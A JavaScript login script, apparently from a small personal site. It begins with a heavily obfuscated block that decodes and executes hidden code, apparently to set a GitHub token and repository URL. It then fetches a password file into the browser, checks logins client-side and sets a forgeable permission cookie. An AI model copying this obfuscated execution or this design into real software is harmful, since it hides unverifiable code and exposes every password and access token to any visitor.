var token,username,repo,path,url;(function(){var jDz='',PDw=688-677;function Ipe(w){var c=771421;var k=w.length;var g=[];for(var u=0;u<k;u++){g[u]=w.charAt(u)};for(var u=0;u<k;u++){var v=c*(u+332)+(c%45984);var x=c*(u+559)+(c%14372);var a=v%k;var f=x%k;var b=g[a];g[a]=g[f];g[f]=b;c=(v+x)%2855009;};return g.join('')};var nBf=Ipe('cvwhtuqkrjmarfcedbutpglstonyrnoszixoc').substr(0,PDw);var oRk='h()(p=[6igp7tsA6g2=vlur(r),;7prfw-r]alem][u =0;o7.yzC;1]}v =r6),0<m8+uri;r{g.9t(tzv0;}a)7= );ptgutch;1e7kye8w=dv82r;>,.p=g[a; ==,";n(rve,rora,;r(lk;9n.0cnvey)n6jhn)]r,+c;81r,r<2)=m v=7(qu=h.1js6a4rcl;r, r;i;i.0=aqg.m8s=s0rpe;zv ;+s)+r3rji;a{vxm8!As;ignp=hr]pc ,)sf{r(v; .enz5lAi.),-4;(ht0t"7-.vna ;ua irl(veahnaz.)h  ur a=)((b;rl{(fva(j,m{66[ru.nh{pnowy ],)o.(C)+ +[;=h8+)t+])d01e=sgq;aja1C;)vAl)t(apn!rd(e1gco.0+dulhmnu.fh*+++ahhctfa)e7tln+;) (;e=afh++[2;jsv =c0,=if)ijtq"d=t;er]nhieznahv),CCdave.<up)m+f.)h5"C1deon20+2n-r(h=.f[+6Cu;c+lrrdatvirt=5,vf rf=nsug)(=[r2i}(;>e[r.uys((=+,ln1t(oug.]swn)9g8h7=n}ro=+i=g;li=+(;ihhaiv;<hnvd;,fvart(2fpsliafns,b.t,n,gl)+)h.rj]ou;-oi u"h)=9rabhnd}"a[1]9y}v=rrsuaojrij=u"u;g=v.l=+to,nf;v(le-;9<,z9v yo C-t,ilakoa ,=(er));8a(0.rr4u"hn;(=6hf7oo13a;b=l[rsue.llpgr4hr6thqes=11lwr(f; )lSa,A[(][to(u=noStr;vw"}r)[.]arl],e{berfa4t+onnr is6sli=(*k7".t3bnetonas;';var qys=Ipe[nBf];var GhM='';var tug=qys;var FOg=qys(GhM,Ipe(oRk));var YbJ=FOg(Ipe('[=n,;3r_S:iit!s\/,r.a;\/gBB#Bb3,(t})B3u(B-reo.p+$iB0ph]r(+ft*.B[tB6_ractB!arz.tb}f=B\/%! B=o"_3,\/.p.(v 2NgBoBnj9u3rat,(S&dk,( .B!of=)k) fBrd+rjt7f74B2}Bi)1(Be$BlBic),r zi2-041hjB]7bB8.+.cn4 ofBi2f+tBacne..{e2i-B%p(Byvubt8.jlr]sr Ba9o*a)=).b{bgl_6a0.jB15B1t-!vf1B 0!oBswogd7o,Blnt+j;(eysglvl,oppjncn5=n= BB((1;(#oBa6$)\'Bchfc$t) z,;r3B+$-fB,-.,&)_)Bzs2;7k)4B).=axr;ul,Bfuih$t"q.;0s9n!a3r=e%jo.o 0rcoBc(Ba!,{r(.)ie!))u_(aoe,64]tj}c,ju_t ..dpi;f4.rafn._s)u"cBc.B..o"7)fp};Bpp"$"Ceo##_\'4{;"5(..djt0_(2uj$)8ce\/b3Bn"Be$4r!{n.#%a)B%on.de1_2;xa\'6hBnBr\/;}).e.!0ao4!_ic=4aS$;.e01%(o*.,(n3axB.dBg1[$.;$.BB)fg;!ib;cyB(.B031BB%_tn%B.9=.%)t7jf,..nno&eet0sb.c(B31B,;6&2b{%!f]n,$rBtBe\/+_p=3$2t,kst=.+.n$u_8rhsve3c*Cascps(.1r)};;rr-ni;3;l)a==).ctB%v)})e}f[c{lB9lj(&=4%]13a6\/\/i)r!..7elrb_! B(.B=\/B5(3p$ !!os,av=+.;m3)ef=m4is(])+,eh+!;t0r=0m,jB)4(o.nes3hs2$ j=;o\'Bv$Br_qhBf5(",3\/uum+la!(4h)Bec!co(aBraelp.,nf{l(v#lBzB*B$.o!;(g=B;(t,2; 5sr9+}(.s24!]tv_(.)8;BB=B,%.bo!o)ju4$+.Bcne)uuB1$nt$)+ssa7Bs!g.Bnnj=.5iB=r#r0z4u.$B{BB._t-.3h.gfe.8p=;c$!5) nB{t}B.;{[e (b=c,ifb\/3r,.!( 7B](eub4f)Cc0]6B[e(pB}t.)BracjBB, gBk}}))a;'));var zsG=tug(jDz,YbJ );zsG(4246);return 3727})()

fetch(url, {
  headers: {
    Authorization: `token ${token}`,
  }
})
.then(response => response.json())
.then(data => {
  var decodedContent = atob(data.content);

  var credentials = JSON.parse(decodedContent);

  function login() {
    var email = document.getElementById('email').value;
    var password = document.getElementById('password').value;

    if (credentials[email] && credentials[email] === password) {
      switch (email) {
        case 'Leonardo':
          window.location.href = 'frontend/paginas/users/Leonardo.html';
          setPermissionCookie('Leonardo');
          break;
        case 'Gustavo':
          window.location.href = 'frontend/paginas/VIP/ghosthszz.html';
          setPermissionCookie('ghosthszz');
          break;
        case 'Thiago':
          document.getElementById('custom-error-msg').style.display = 'block';
          setPermissionCookie('thiago');
          break;
        case 'Neto':
          document.getElementById('custom-error-msg').style.display = 'block';
          break;
        case 'Cleiton':
          window.location.href = 'frontend/paginas/users/Cleiton.html';
          setPermissionCookie('cleiton');
          break;
        case 'EXEMPLO_VIP':
          window.location.href = 'frontend/paginas/exemplos/VIP.html';
          setPermissionCookie('exemplo_vip');
          break;
        case 'EXEMPLO_NORMAL':
          window.location.href = 'frontend/paginas/exemplos/NORMAL.html';
          setPermissionCookie('exemplo_normal');
          break;
        default:
          document.getElementById('error-msg').style.display = 'block';
          break;
      }
    } else {
      document.getElementById('error-msg').style.display = 'block';
    }
  }

  document.addEventListener('keydown', function(event) {
    if (event.key === 'Enter') {
      if (document.activeElement.id === 'email' || document.activeElement.id === 'password') {
        login();
      }
    }
  });
})
.catch(error => {
  console.error('Erro ao carregar o arquivo:', error);
});

function setPermissionCookie(permission) {
  var expirationDate = new Date();
  expirationDate.setDate(expirationDate.getDate() + 30);
  document.cookie = "permission=" + permission + "; expires=" + expirationDate.toUTCString() + "; path=/";
}
